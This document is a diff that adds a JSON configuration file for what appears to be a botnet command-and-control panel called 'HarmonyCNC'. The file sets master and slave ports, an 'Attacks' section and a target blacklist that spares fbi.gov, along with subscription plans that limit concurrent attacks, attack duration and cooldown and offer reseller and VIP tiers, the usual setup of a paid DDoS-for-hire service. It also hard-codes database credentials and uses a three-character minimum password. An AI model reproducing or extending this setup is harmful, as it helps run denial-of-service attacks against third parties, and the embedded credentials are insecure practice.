@@ -1,0 +1,88 @@
+{
+     "Masters" : {
+          "MasterPort" : ":8123",
+          "MaxAuthTries" : 3
+     },
+
+     "Slaves" : {
+          "Status" : false,
+          "Slaves" : ":9992"
+     },
+
+     "SQL" : {
+          "SQL-Host" : "localhost:3306",
+          "SQL-Username" : "Guns",
+          "SQL-Password" : "Guns1212",
+          "SQL-Name" : "HarmonyCNC",
+
+          "SQL-Audit" : {
+               "Status" : true,
+               "LogDetails" : "RootLogin.txt", 
+               "Username" : "root"
+          }
+     },
+
+     "Branding" : {
+          "AppName" : "Harmony",
+          "PrimaryColor" : "40;38;2;127;0;255m",
+          "MaxConcurrentsReached" : "Max Running Limit Has Been Reached",
+          "OverAllowedTime" : "Request is over your max time limit"
+     },
+
+     "DisabledCommands" : [
+          "help"
+     ],
+
+     "Controls" : {
+          "Catpcha" : {
+               "Status" : false,
+               "Header" : "You must answer the question correctly to gain access!", 
+               "AllowedAttempts" : 4,
+               "AdminBypass" : false,
+               "Question" : {
+                    "MinGen" : 5,
+                    "MaxGen" : 99
+               }
+          },
+
+          "MFA" : {
+               "ForceMFA" : false,
+               "AdminBypassForce" : true,
+               "AppName" : "Harmony"
+          },
+
+          "Ongoing" : {
+               "ShowGlobalAttacks" : true
+          }
+     },
+
+     "Plans" : {
+          "minPassLen" : 3,
+          "MaxSessions" : 1,
+          "Presets" : [
+               {
+                    "Name" : "basic",
+                    "Description" : "Standard Plan!",
+     
+                    "Concurrents" : 1,
+                    "cooldown" : 60,
+                    "maxTime" : 300,
+     
+                    "PowerSavingExempt" : true,
+                    "PlanTimeDays" : 31,
+                    "BypassBlacklist" : true,
+                    "MaxSessions" : 1,
+                    "Reseller" : false,
+                    "VIP" : false
+               }
+          ]
+     },
+
+     "Attacks" : {
+          "AttackDebug" : true,
+          "Blacklists" : [
+               "fbi.gov",
+               "1.1.1.1"
+          ]
+     }
+}
